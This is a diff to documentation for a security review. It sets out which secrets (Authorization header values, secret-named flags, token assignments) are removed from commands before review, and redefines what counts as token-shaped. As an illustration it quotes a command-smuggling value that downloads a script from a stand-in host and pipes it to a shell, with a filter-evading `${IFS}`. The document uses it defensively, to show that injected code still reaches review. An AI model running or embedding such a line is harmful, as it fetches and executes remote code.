@@ -461,7 +461,9 @@ place of, each of these where it is token-shaped:
 - the login of an address, all of it (`https://user:password@host` is
   `https://host`; here the login is removed, not replaced);
 - the value of an `Authorization:` header, after its scheme where it has one
-  (`Bearer`, `Basic`, `token`), and the word after `Bearer` or `Basic`;
+  (`Bearer`, `Basic`, `token`), within the quotes the header opened
+  (`-H "Authorization: Bearer x"`); `Bearer` or `Basic` anywhere else, or a
+  word after the closing quote, is sent as written;
 - the value after a flag named for a secret (`--api-key x`, `--authToken x`,
   `--clientSecret x`), and after `=` where a name before it is named for a
   secret (`--token=x`, `GITHUB_TOKEN=x`, `--env=API_KEY=x`). A name is named
@@ -472,11 +474,13 @@ place of, each of these where it is token-shaped:
 - what the review's own removal takes out of any text it sends
   (`export API_KEY=…`).
 
-Token-shaped means letters, digits and `._~%+=:/-` only, not starting with
-`$`, `/`, `~` or `.`. Anything else is sent as written, since taking it out
-would hide code from the review: `TOKEN=x;curl${IFS}evil.sh|sh` reaches the
-review whole, and so does a variable (`$TOKEN`) or a path, which holds no
-secret itself and is what a review needs to see. What is followed is the line
+Token-shaped means letters, digits and `._~%+=:-` only, not starting with
+`~` or `.`. Anything else is sent as written, since taking it out would hide
+code from the review: `TOKEN=x;curl${IFS}evil.sh|sh` reaches the review
+whole, and so does a variable (`$TOKEN`), an address or a path
+(`--auth-url https://…`, `--password-command bin/x.sh`), which holds no
+secret itself and is what a review needs to see. A token with a `/` in it
+(some base64 ones) is therefore sent too. What is followed is the line
 as written, so whatever it names is found; what the sweep's output and saved
 reports show the entry runs is the very text sent to the review.
 
